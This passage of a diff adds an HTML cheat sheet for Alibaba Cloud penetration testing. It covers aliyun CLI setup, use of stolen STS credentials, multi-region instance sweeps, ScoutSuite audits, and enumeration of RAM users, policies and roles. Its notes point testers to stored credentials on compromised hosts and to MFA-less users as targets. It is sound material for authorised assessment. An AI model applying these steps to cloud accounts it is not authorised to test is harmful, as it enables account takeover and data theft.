@@ -1,0 +1,2741 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Alibaba Cloud Security Cheat Sheet</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Syne:wght@400;600;800&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg: #0a0c0f;
+  --surface: #111418;
+  --surface2: #181d23;
+  --border: #1e2530;
+  --accent: #e85d04;
+  --accent2: #f48c06;
+  --green: #2ecc71;
+  --red: #e74c3c;
+  --yellow: #f39c12;
+  --blue: #3498db;
+  --purple: #9b59b6;
+  --text: #d4dce8;
+  --text-dim: #6b7a8d;
+  --text-bright: #eef2f7;
+  --mono: 'JetBrains Mono', monospace;
+  --sans: 'Syne', sans-serif;
+}
+* { margin: 0; padding: 0; box-sizing: border-box; }
+html { scroll-behavior: smooth; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: var(--mono);
+  font-size: 13px;
+  display: flex;
+  min-height: 100vh;
+}
+
+/* SIDEBAR */
+#sidebar {
+  width: 220px;
+  min-width: 220px;
+  background: var(--surface);
+  border-right: 1px solid var(--border);
+  position: sticky;
+  top: 0;
+  height: 100vh;
+  overflow-y: auto;
+  display: flex;
+  flex-direction: column;
+  transition: width 0.2s ease, min-width 0.2s ease;
+}
+#sidebar.collapsed {
+  width: 0;
+  min-width: 0;
+  overflow: hidden;
+  border-right: none;
+}
+#toggle-sidebar {
+  position: fixed;
+  top: 12px;
+  left: 12px;
+  z-index: 100;
+  background: var(--surface2);
+  border: 1px solid var(--border);
+  color: var(--text-dim);
+  font-family: var(--mono);
+  font-size: 11px;
+  padding: 5px 9px;
+  border-radius: 4px;
+  cursor: pointer;
+  transition: all 0.15s;
+  letter-spacing: 0.5px;
+}
+#toggle-sidebar:hover { background: var(--accent); color: white; border-color: var(--accent); }
+#sidebar-header {
+  padding: 20px 16px 16px;
+  border-bottom: 1px solid var(--border);
+}
+#sidebar-header .logo {
+  font-family: var(--sans);
+  font-weight: 800;
+  font-size: 15px;
+  color: var(--accent);
+  letter-spacing: -0.3px;
+  line-height: 1.2;
+}
+#sidebar-header .subtitle {
+  font-size: 10px;
+  color: var(--text-dim);
+  margin-top: 4px;
+  letter-spacing: 0.5px;
+  text-transform: uppercase;
+}
+.nav-section-label {
+  padding: 14px 16px 6px;
+  font-size: 9px;
+  color: var(--text-dim);
+  text-transform: uppercase;
+  letter-spacing: 1.2px;
+  font-family: var(--sans);
+  font-weight: 600;
+}
+.nav-item {
+  display: block;
+  padding: 7px 16px;
+  color: var(--text-dim);
+  text-decoration: none;
+  font-size: 12px;
+  border-left: 2px solid transparent;
+  transition: all 0.15s;
+  cursor: pointer;
+}
+.nav-item:hover { color: var(--text-bright); background: var(--surface2); }
+.nav-item.active { color: var(--accent); border-left-color: var(--accent); background: rgba(232,93,4,0.08); }
+.nav-dot {
+  display: inline-block;
+  width: 5px;
+  height: 5px;
+  border-radius: 50%;
+  margin-right: 8px;
+  vertical-align: middle;
+  margin-top: -1px;
+}
+
+/* SEARCH */
+.search-wrap { padding: 10px 12px; border-bottom: 1px solid var(--border); }
+#search {
+  width: 100%;
+  background: var(--surface2);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 6px 10px;
+  color: var(--text);
+  font-family: var(--mono);
+  font-size: 11px;
+  outline: none;
+}
+#search:focus { border-color: var(--accent); }
+#search::placeholder { color: var(--text-dim); }
+
+/* MAIN */
+#main {
+  flex: 1;
+  overflow-y: auto;
+  padding: 28px 32px 60px;
+  max-width: 1000px;
+}
+.page-header {
+  margin-bottom: 32px;
+  padding-bottom: 20px;
+  border-bottom: 1px solid var(--border);
+}
+.page-header h1 {
+  font-family: var(--sans);
+  font-weight: 800;
+  font-size: 28px;
+  color: var(--text-bright);
+  line-height: 1.1;
+}
+.page-header h1 span { color: var(--accent); }
+.page-header p { color: var(--text-dim); font-size: 12px; margin-top: 8px; max-width: 600px; line-height: 1.7; }
+.badges { display: flex; gap: 8px; margin-top: 12px; flex-wrap: wrap; }
+.badge {
+  font-size: 10px;
+  padding: 3px 8px;
+  border-radius: 3px;
+  font-family: var(--sans);
+  font-weight: 600;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+}
+.badge-warn { background: rgba(232,93,4,0.15); color: var(--accent); border: 1px solid rgba(232,93,4,0.3); }
+.badge-info { background: rgba(52,152,219,0.1); color: var(--blue); border: 1px solid rgba(52,152,219,0.25); }
+
+/* SECTIONS */
+.section { margin-bottom: 36px; }
+.section-header {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  margin-bottom: 14px;
+  padding-bottom: 8px;
+  border-bottom: 1px solid var(--border);
+}
+.section-icon {
+  width: 28px;
+  height: 28px;
+  border-radius: 6px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 13px;
+  flex-shrink: 0;
+}
+.section-title {
+  font-family: var(--sans);
+  font-weight: 700;
+  font-size: 16px;
+  color: var(--text-bright);
+}
+.section-id {
+  font-size: 10px;
+  color: var(--text-dim);
+  font-family: var(--mono);
+  margin-left: auto;
+}
+
+/* CARDS */
+.card {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  margin-bottom: 10px;
+  overflow: hidden;
+}
+.card-header {
+  padding: 9px 14px;
+  background: var(--surface2);
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  cursor: pointer;
+  user-select: none;
+}
+.card-title {
+  font-family: var(--sans);
+  font-weight: 600;
+  font-size: 12px;
+  color: var(--text-bright);
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+.card-tag {
+  font-size: 9px;
+  padding: 2px 6px;
+  border-radius: 3px;
+  font-family: var(--mono);
+  text-transform: uppercase;
+}
+.tag-red { background: rgba(231,76,60,0.15); color: var(--red); }
+.tag-yellow { background: rgba(243,156,18,0.15); color: var(--yellow); }
+.tag-green { background: rgba(46,204,113,0.15); color: var(--green); }
+.tag-blue { background: rgba(52,152,219,0.15); color: var(--blue); }
+.tag-purple { background: rgba(155,89,182,0.15); color: var(--purple); }
+.tag-orange { background: rgba(232,93,4,0.15); color: var(--accent); }
+.chevron { color: var(--text-dim); font-size: 10px; transition: transform 0.2s; }
+.card-body { padding: 12px 14px; display: none; border-top: 1px solid var(--border); }
+.card-body.open { display: block; }
+
+/* CODE BLOCKS */
+.cmd-block {
+  background: #070a0e;
+  border: 1px solid #1a2030;
+  border-radius: 4px;
+  margin: 6px 0;
+  position: relative;
+}
+.cmd-label {
+  font-size: 9px;
+  color: var(--text-dim);
+  padding: 5px 10px 0;
+  text-transform: uppercase;
+  letter-spacing: 0.8px;
+}
+.cmd-text {
+  padding: 6px 10px 8px;
+  white-space: pre-wrap;
+  word-break: break-all;
+  color: #a8d8a8;
+  font-size: 12px;
+  line-height: 1.6;
+}
+.cmd-text .flag { color: #88bbff; }
+.cmd-text .comment { color: #4a5568; }
+.cmd-text .value { color: #ffd700; }
+.cmd-text .keyword { color: var(--accent2); }
+.copy-btn {
+  position: absolute;
+  top: 5px;
+  right: 6px;
+  background: var(--surface2);
+  border: 1px solid var(--border);
+  color: var(--text-dim);
+  font-family: var(--mono);
+  font-size: 9px;
+  padding: 3px 7px;
+  border-radius: 3px;
+  cursor: pointer;
+  transition: all 0.15s;
+}
+.copy-btn:hover { background: var(--accent); color: white; border-color: var(--accent); }
+.copy-btn.copied { background: var(--green); color: white; border-color: var(--green); }
+
+/* DESC TEXT */
+.desc { font-size: 11.5px; color: var(--text-dim); line-height: 1.7; margin-bottom: 8px; }
+.note {
+  background: rgba(243,156,18,0.07);
+  border-left: 3px solid var(--yellow);
+  padding: 7px 10px;
+  margin: 8px 0;
+  font-size: 11.5px;
+  color: #c4a44a;
+  line-height: 1.6;
+  border-radius: 0 3px 3px 0;
+}
+.danger {
+  background: rgba(231,76,60,0.07);
+  border-left: 3px solid var(--red);
+  padding: 7px 10px;
+  margin: 8px 0;
+  font-size: 11.5px;
+  color: #c45c4a;
+  line-height: 1.6;
+  border-radius: 0 3px 3px 0;
+}
+.info-box {
+  background: rgba(52,152,219,0.07);
+  border-left: 3px solid var(--blue);
+  padding: 7px 10px;
+  margin: 8px 0;
+  font-size: 11.5px;
+  color: #4a8ac4;
+  line-height: 1.6;
+  border-radius: 0 3px 3px 0;
+}
+.success-box {
+  background: rgba(46,204,113,0.07);
+  border-left: 3px solid var(--green);
+  padding: 7px 10px;
+  margin: 8px 0;
+  font-size: 11.5px;
+  color: #3a9e6a;
+  line-height: 1.6;
+  border-radius: 0 3px 3px 0;
+}
+
+/* TABLE */
+.ref-table { width: 100%; border-collapse: collapse; font-size: 11.5px; }
+.ref-table th {
+  text-align: left;
+  padding: 6px 10px;
+  background: var(--surface2);
+  color: var(--text-dim);
+  font-size: 10px;
+  text-transform: uppercase;
+  letter-spacing: 0.8px;
+  font-family: var(--sans);
+  font-weight: 600;
+  border-bottom: 1px solid var(--border);
+}
+.ref-table td {
+  padding: 7px 10px;
+  border-bottom: 1px solid #0f1419;
+  vertical-align: top;
+  line-height: 1.5;
+}
+.ref-table tr:hover td { background: rgba(255,255,255,0.015); }
+.mono { font-family: var(--mono); color: #88bbff; }
+.highlight { color: var(--accent2); font-weight: 500; }
+
+/* GRID */
+.two-col { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+@media (max-width: 700px) { .two-col { grid-template-columns: 1fr; } }
+
+/* HIDDEN */
+.hidden { display: none !important; }
+
+/* SCROLLBAR */
+::-webkit-scrollbar { width: 4px; height: 4px; }
+::-webkit-scrollbar-track { background: transparent; }
+::-webkit-scrollbar-thumb { background: #1e2530; border-radius: 2px; }
+::-webkit-scrollbar-thumb:hover { background: #2d3748; }
+
+/* FILTER NOTICE */
+#filter-notice {
+  display: none;
+  padding: 10px 14px;
+  background: rgba(232,93,4,0.08);
+  border: 1px solid rgba(232,93,4,0.2);
+  border-radius: 5px;
+  font-size: 12px;
+  color: var(--accent);
+  margin-bottom: 16px;
+}
+</style>
+</head>
+<body>
+
+<!-- DATA ISLAND -->
+<script type="application/json" id="cheatsheet-data">
+{
+  "nav": [
+    { "id": "setup", "label": "Setup & Auth", "dot": "#e85d04" },
+    { "id": "recon", "label": "Reconnaissance", "dot": "#3498db" },
+    { "id": "ram", "label": "RAM & IAM", "dot": "#9b59b6" },
+    { "id": "imds", "label": "IMDS / SSRF", "dot": "#e74c3c" },
+    { "id": "ecs", "label": "ECS (Compute)", "dot": "#2ecc71" },
+    { "id": "oss", "label": "OSS (Storage)", "dot": "#f39c12" },
+    { "id": "rds", "label": "RDS (Database)", "dot": "#3498db" },
+    { "id": "network", "label": "VPC & Networking", "dot": "#9b59b6" },
+    { "id": "unauth", "label": "Unauth Enumeration", "dot": "#f39c12" },
+    { "id": "footholds", "label": "Footholds", "dot": "#e74c3c" },
+    { "id": "privesc", "label": "Priv Escalation", "dot": "#e74c3c" },
+    { "id": "postexploit", "label": "Post-Exploitation", "dot": "#9b59b6" },
+    { "id": "persistence", "label": "Persistence", "dot": "#e85d04" },
+    { "id": "tools", "label": "Tools", "dot": "#2ecc71" },
+    { "id": "reference", "label": "Quick Reference", "dot": "#e85d04" }
+  ]
+}
+</script>
+
+<button id="toggle-sidebar" title="Toggle sidebar">☰</button>
+
+<!-- SIDEBAR -->
+<nav id="sidebar">
+  <div id="sidebar-header">
+    <div class="logo">AliCloud<br>Pentest</div>
+    <div class="subtitle">Security Cheat Sheet</div>
+  </div>
+  <div class="search-wrap">
+    <input type="text" id="search" placeholder="Search commands...">
+  </div>
+  <div id="nav-links"></div>
+</nav>
+
+<!-- MAIN CONTENT -->
+<main id="main">
+  <div id="filter-notice"></div>
+
+  <div class="page-header">
+    <h1>Alibaba Cloud<br><span>Security Engagement</span> Cheat Sheet</h1>
+    <p>CLI commands, enumeration workflows, attack paths, and reference for Alibaba Cloud (Aliyun) penetration testing engagements. Covers aliyun CLI, ossutil, RAM/IAM, IMDS, ECS, OSS, RDS, VPC, and privilege escalation.</p>
+    <div class="badges">
+      <span class="badge badge-warn">⚠ Authorized Testing Only</span>
+      <span class="badge badge-info">aliyun CLI v3.x</span>
+      <span class="badge badge-info">Aliyun SDK compatible</span>
+    </div>
+  </div>
+
+  <!-- ═══════════════════════════════════ SETUP & AUTH ═══════════ -->
+  <section class="section" id="setup">
+    <div class="section-header">
+      <div class="section-icon" style="background:rgba(232,93,4,0.12)">⚙</div>
+      <span class="section-title">Setup & Authentication</span>
+      <span class="section-id">#01</span>
+    </div>
+
+    <div class="card">
+      <div class="card-header" onclick="toggleCard(this)">
+        <span class="card-title">📦 Install aliyun CLI</span>
+        <span class="chevron">▼</span>
+      </div>
+      <div class="card-body open">
+        <p class="desc">The primary CLI tool for all Alibaba Cloud API calls. Required for most enumeration tasks.</p>
+        <div class="cmd-block">
+          <span class="cmd-label">Linux/macOS (direct)</span>
+          <pre class="cmd-text">wget https://aliyuncli.alicdn.com/aliyun-cli-linux-latest-amd64.tgz
+tar xzf aliyun-cli-linux-latest-amd64.tgz
+sudo mv aliyun /usr/local/bin/
+aliyun --version</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">macOS (Homebrew)</span>
+          <pre class="cmd-text">brew install aliyun-cli</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">ossutil (Object Storage CLI)</span>
+          <pre class="cmd-text"># Linux
+wget https://gosspublic.alicdn.com/ossutil/latest/ossutil64 -O ossutil
+chmod +x ossutil && sudo mv ossutil /usr/local/bin/</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header" onclick="toggleCard(this)">
+        <span class="card-title">🔑 Configure Credentials <span class="card-tag tag-orange">FIRST STEP</span></span>
+        <span class="chevron">▼</span>
+      </div>
+      <div class="card-body open">
+        <p class="desc">Multiple auth modes. Use AccessKey for long-term creds, EcsRamRole from within an EC2-equivalent instance, RamRoleArn for assumed roles, StsToken for temporary creds.</p>
+        <div class="cmd-block">
+          <span class="cmd-label">Interactive setup (AccessKey)</span>
+          <pre class="cmd-text">aliyun configure
+# Prompts for: Access Key ID, Access Key Secret, Region ID, Output format
+# Config stored in ~/.aliyun/config.json</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Non-interactive / scripted</span>
+          <pre class="cmd-text">aliyun configure set \
+  --profile myprofile \
+  --mode AK \
+  --region cn-hangzhou \
+  --access-key-id &lt;AKID&gt; \
+  --access-key-secret &lt;AKSECRET&gt;</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">STS Token (temporary credentials — post-IMDS theft)</span>
+          <pre class="cmd-text">aliyun configure set \
+  --profile sts-profile \
+  --mode StsToken \
+  --region cn-hangzhou \
+  --access-key-id &lt;TEMP_AKID&gt; \
+  --access-key-secret &lt;TEMP_AKSECRET&gt; \
+  --sts-token &lt;STS_TOKEN&gt;</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">RamRoleArn (assume a role)</span>
+          <pre class="cmd-text">aliyun configure set \
+  --profile assumed \
+  --mode RamRoleArn \
+  --region cn-hangzhou \
+  --access-key-id &lt;AKID&gt; \
+  --access-key-secret &lt;AKSECRET&gt; \
+  --ram-role-arn acs:ram::&lt;ACCOUNT_ID&gt;:role/&lt;ROLE_NAME&gt; \
+  --role-session-name pentest</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">EcsRamRole (from inside an ECS instance)</span>
+          <pre class="cmd-text">aliyun configure set \
+  --profile ecs-role \
+  --mode EcsRamRole \
+  --region cn-hangzhou \
+  --ram-role-name &lt;ROLE_NAME&gt;</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Via environment variables</span>
+          <pre class="cmd-text">export ALIBABA_CLOUD_ACCESS_KEY_ID="AKID..."
+export ALIBABA_CLOUD_ACCESS_KEY_SECRET="Secret..."
+export ALIBABA_CLOUD_SECURITY_TOKEN="StsToken..."  # if using STS
+export ALIBABA_CLOUD_REGION_ID="cn-hangzhou"</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">List profiles / switch profile</span>
+          <pre class="cmd-text">aliyun configure list             # list all profiles
+aliyun configure get              # show current profile config
+aliyun --profile myprofile ecs DescribeInstances  # use specific profile</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <p class="note">Config file lives at <span class="mono">~/.aliyun/config.json</span> — always check this on compromised hosts for stored credentials.</p>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header" onclick="toggleCard(this)">
+        <span class="card-title">👤 Verify Identity (Who Am I?)</span>
+        <span class="chevron">▼</span>
+      </div>
+      <div class="card-body open">
+        <div class="cmd-block">
+          <span class="cmd-label">Get caller identity</span>
+          <pre class="cmd-text">aliyun sts GetCallerIdentity</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <p class="desc">Returns: AccountId, UserId, Arn, IdentityType (Account/RAMUser/AssumedRoleUser). The ARN format reveals whether you're a root account, RAM user, or assumed role.</p>
+        <div class="cmd-block">
+          <span class="cmd-label">ARN formats</span>
+          <pre class="cmd-text"># Root account
+acs:ram::&lt;ACCOUNT_ID&gt;:root
+
+# RAM user
+acs:ram::&lt;ACCOUNT_ID&gt;:user/&lt;USERNAME&gt;
+
+# Assumed role (STS)
+acs:ram::&lt;ACCOUNT_ID&gt;:assumed-role/&lt;ROLE_NAME&gt;/&lt;SESSION&gt;
+
+# Service account (ECS role)
+acs:sts::&lt;ACCOUNT_ID&gt;:assumed-role/&lt;ROLE_NAME&gt;/&lt;INSTANCE_ID&gt;</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header" onclick="toggleCard(this)">
+        <span class="card-title">🌍 Regions Reference</span>
+        <span class="chevron">▼</span>
+      </div>
+      <div class="card-body">
+        <div class="cmd-block">
+          <span class="cmd-label">List all regions</span>
+          <pre class="cmd-text">aliyun ecs DescribeRegions</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <table class="ref-table" style="margin-top:8px">
+          <thead><tr><th>Region ID</th><th>Location</th></tr></thead>
+          <tbody>
+            <tr><td class="mono">cn-hangzhou</td><td>China (Hangzhou)</td></tr>
+            <tr><td class="mono">cn-shanghai</td><td>China (Shanghai)</td></tr>
+            <tr><td class="mono">cn-beijing</td><td>China (Beijing)</td></tr>
+            <tr><td class="mono">cn-shenzhen</td><td>China (Shenzhen)</td></tr>
+            <tr><td class="mono">ap-southeast-1</td><td>Singapore</td></tr>
+            <tr><td class="mono">ap-southeast-2</td><td>Australia (Sydney)</td></tr>
+            <tr><td class="mono">ap-northeast-1</td><td>Japan (Tokyo)</td></tr>
+            <tr><td class="mono">us-east-1</td><td>US (Virginia)</td></tr>
+            <tr><td class="mono">us-west-1</td><td>US (Silicon Valley)</td></tr>
+            <tr><td class="mono">eu-central-1</td><td>Germany (Frankfurt)</td></tr>
+            <tr><td class="mono">me-east-1</td><td>UAE (Dubai)</td></tr>
+          </tbody>
+        </table>
+        <p class="note">Always enumerate all regions — resources are often scattered. Run discovery commands for each region or iterate in a loop.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- ═══════════════════════════════════ RECONNAISSANCE ════════ -->
+  <section class="section" id="recon">
+    <div class="section-header">
+      <div class="section-icon" style="background:rgba(52,152,219,0.12)">🔭</div>
+      <span class="section-title">Reconnaissance & Enumeration</span>
+      <span class="section-id">#02</span>
+    </div>
+
+    <div class="card">
+      <div class="card-header" onclick="toggleCard(this)">
+        <span class="card-title">🗺 Account-Wide Discovery</span>
+        <span class="chevron">▼</span>
+      </div>
+      <div class="card-body open">
+        <p class="desc">Start with broad account-level enumeration before drilling into specific services. Run these first.</p>
+        <div class="cmd-block">
+          <span class="cmd-label">Get account/identity info</span>
+          <pre class="cmd-text">aliyun sts GetCallerIdentity
+aliyun ram GetAccountAlias   # get the account alias/name</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Resource Group enumeration</span>
+          <pre class="cmd-text">aliyun resourcemanager ListResourceGroups
+aliyun resourcemanager GetResourceGroup --ResourceGroupId rg-xxxxxx</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Multi-region ECS sweep (bash loop)</span>
+          <pre class="cmd-text">for region in cn-hangzhou cn-shanghai cn-beijing ap-southeast-1 us-east-1; do
+  echo "=== $region ==="
+  aliyun --region $region ecs DescribeInstances \
+    --output cols=InstanceId,InstanceName,Status,PublicIpAddress \
+    rows=Instances.Instance[]
+done</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">List services available (help)</span>
+          <pre class="cmd-text">aliyun --help  # shows all supported services</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header" onclick="toggleCard(this)">
+        <span class="card-title">🔍 ScoutSuite (Automated Cloud Audit)</span>
+        <span class="chevron">▼</span>
+      </div>
+      <div class="card-body">
+        <p class="desc">ScoutSuite by NCC Group supports Alibaba Cloud. Runs a comprehensive multi-service audit and produces an HTML report with findings, severity ratings, and evidence.</p>
+        <div class="cmd-block">
+          <span class="cmd-label">Install and run ScoutSuite</span>
+          <pre class="cmd-text">pip install scoutsuite
+
+# Set credentials via env vars first, then:
+scout aliyun --report-dir ./scout-report
+
+# Or with explicit profile:
+scout aliyun --access-key-id &lt;AKID&gt; \
+             --access-key-secret &lt;AKSECRET&gt; \
+             --report-dir ./scout-report</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Docker-based ScoutSuite</span>
+          <pre class="cmd-text">docker run -it --rm \
+  -e ALIBABA_CLOUD_ACCESS_KEY_ID=&lt;AKID&gt; \
+  -e ALIBABA_CLOUD_ACCESS_KEY_SECRET=&lt;SECRET&gt; \
+  -v $(pwd)/report:/root/scout-report \
+  nccgroup/scoutsuite scout aliyun</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <p class="note">ScoutSuite covers: ECS, OSS, RAM, RDS, VPC, SLB, ActionTrail, CloudMonitor, KMS, and more. Review its HTML report first, then manually investigate flagged issues.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- ═══════════════════════════════════ RAM / IAM ═════════════ -->
+  <section class="section" id="ram">
+    <div class="section-header">
+      <div class="section-icon" style="background:rgba(155,89,182,0.12)">🛡</div>
+      <span class="section-title">RAM — Resource Access Management (IAM)</span>
+      <span class="section-id">#03</span>
+    </div>
+
+    <div class="info-box">
+      <strong>RAM vs AWS IAM:</strong> RAM (Resource Access Management) is Alibaba Cloud's IAM equivalent. RAM Users = IAM Users. RAM Roles = IAM Roles. RAM Policies = IAM Policies. STS (Security Token Service) provides temporary credentials. The root account is called the "Alibaba Cloud account" or "primary account."
+    </div>
+
+    <div class="card">
+      <div class="card-header" onclick="toggleCard(this)">
+        <span class="card-title">👥 Enumerate Users & Groups <span class="card-tag tag-purple">HIGH VALUE</span></span>
+        <span class="chevron">▼</span>
+      </div>
+      <div class="card-body open">
+        <div class="cmd-block">
+          <span class="cmd-label">List all RAM users</span>
+          <pre class="cmd-text">aliyun ram ListUsers
+aliyun ram ListUsers --MaxItems 100</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Get specific user details</span>
+          <pre class="cmd-text">aliyun ram GetUser --UserName &lt;USERNAME&gt;
+aliyun ram ListAccessKeys --UserName &lt;USERNAME&gt;  # check for access keys
+aliyun ram GetLoginProfile --UserName &lt;USERNAME&gt;  # check console login</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">List groups and memberships</span>
+          <pre class="cmd-text">aliyun ram ListGroups
+aliyun ram ListUsersForGroup --GroupName &lt;GROUP&gt;
+aliyun ram ListGroupsForUser --UserName &lt;USERNAME&gt;</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">List virtual MFA devices</span>
+          <pre class="cmd-text">aliyun ram ListVirtualMFADevices</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <p class="note">Users without MFA but with console access are high-value targets. Users with AccessKeys AND console login increase attack surface.</p>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header" onclick="toggleCard(this)">
+        <span class="card-title">📋 Enumerate Policies <span class="card-tag tag-red">CRITICAL</span></span>
+        <span class="chevron">▼</span>
+      </div>
+      <div class="card-body open">
+        <div class="cmd-block">
+          <span class="cmd-label">List all policies (custom only)</span>
+          <pre class="cmd-text">aliyun ram ListPolicies --PolicyType Custom
+aliyun ram ListPolicies --PolicyType System  # Alibaba-managed policies</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Get policy document (view permissions)</span>
+          <pre class="cmd-text">aliyun ram GetPolicy \
+  --PolicyType Custom \
+  --PolicyName &lt;POLICY_NAME&gt;
+
+aliyun ram GetPolicyVersion \
+  --PolicyType Custom \
+  --PolicyName &lt;POLICY_NAME&gt; \
+  --VersionId v1</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">List policies attached to a user</span>
+          <pre class="cmd-text">aliyun ram ListPoliciesForUser --UserName &lt;USERNAME&gt;</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">List policies attached to a group</span>
+          <pre class="cmd-text">aliyun ram ListPoliciesForGroup --GroupName &lt;GROUP&gt;</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">List policies attached to a role</span>
+          <pre class="cmd-text">aliyun ram ListPoliciesForRole --RoleName &lt;ROLE&gt;</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="danger">Look for overly permissive policies: <strong>AdministratorAccess</strong>, <strong>AliyunRAMFullAccess</strong>, <strong>AliyunECSFullAccess</strong>, or any with <code>Action: "*"</code> or <code>Resource: "*"</code>.</div>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header" onclick="toggleCard(this)">
+        <span class="card-title">🎭 Enumerate Roles <span class="card-tag tag-red">CRITICAL</span></span>
+        <span class="chevron">▼</span>
+      </div>
+      <div class="card-body open">
+        <div class="cmd-block">
+          <span class="cmd-label">List all roles</span>
+          <pre class="cmd-text">aliyun ram ListRoles
+aliyun ram ListRoles --MaxItems 100</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Get role details (inspect trust policy)</span>
+          <pre class="cmd-text">aliyun ram GetRole --RoleName &lt;ROLE_NAME&gt;</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">List entities (users/services) that can assume a role</span>
+          <pre class="cmd-text"># The trust policy is in GetRole output — check "AssumeRolePolicyDocument"
+# Look for wildcard principals or overly broad conditions</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <p class="note">Roles with trust policy <code>"Principal": {"RAM": "acs:ram::*:root"}</code> or broad cross-account trust are escalation paths.</p>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header" onclick="toggleCard(this)">
+        <span class="card-title">🔐 STS — Assume a Role</span>
+        <span class="chevron">▼</span>
+      </div>
+      <div class="card-body">
+        <p class="desc">If you have <code>sts:AssumeRole</code> permission (via <code>AliyunSTSAssumeRoleAccess</code> policy), you can assume roles and gain their permissions.</p>
+        <div class="cmd-block">
+          <span class="cmd-label">Assume a role and get STS token</span>
+          <pre class="cmd-text">aliyun sts AssumeRole \
+  --RoleArn acs:ram::&lt;ACCOUNT_ID&gt;:role/&lt;ROLE_NAME&gt; \
+  --RoleSessionName pentest \
+  --DurationSeconds 3600</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Use the returned STS credentials</span>
+          <pre class="cmd-text"># From the AssumeRole response, extract:
+# Credentials.AccessKeyId
+# Credentials.AccessKeySecret
+# Credentials.SecurityToken
+# Credentials.Expiration
+
+# Configure as new profile:
+aliyun configure set \
+  --profile assumed-role \
+  --mode StsToken \
+  --region cn-hangzhou \
+  --access-key-id &lt;TEMP_AKID&gt; \
+  --access-key-secret &lt;TEMP_SECRET&gt; \
+  --sts-token &lt;SECURITY_TOKEN&gt;</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
